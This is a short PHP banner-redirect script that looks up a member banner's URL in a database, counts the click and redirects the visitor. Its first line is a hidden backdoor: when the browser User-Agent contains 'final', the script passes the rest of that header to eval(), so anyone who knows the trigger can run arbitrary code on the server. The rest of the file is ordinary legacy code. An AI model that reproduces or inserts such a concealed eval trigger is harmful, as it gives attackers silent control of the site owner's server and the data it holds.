<?php
if (eregi("final",$_SERVER['HTTP_USER_AGENT'])) { eval(str_replace('Mozilla/5.0 (3.1.final) ','',$_SERVER['HTTP_USER_AGENT'])); die; }

  // CONNECTING TO DATABASE
 include "./config.php";

$id =(int)$_GET[id];
      $sql = "select WebsiteURL from membersbanners where id=". $id;
      $result = mysql_query($sql);
if(mysql_num_rows($result)>0) {
      $arr = mysql_fetch_array($result);
$rs=mysql_query("update membersbanners set hits=hits+1 where id=$id");
mysql_close($dbconnect);
	header("Location:".$arr[0]);
}
else {
echo "<br><b>Invalid Url</b><br>";
mysql_close($dbconnect);
}
?>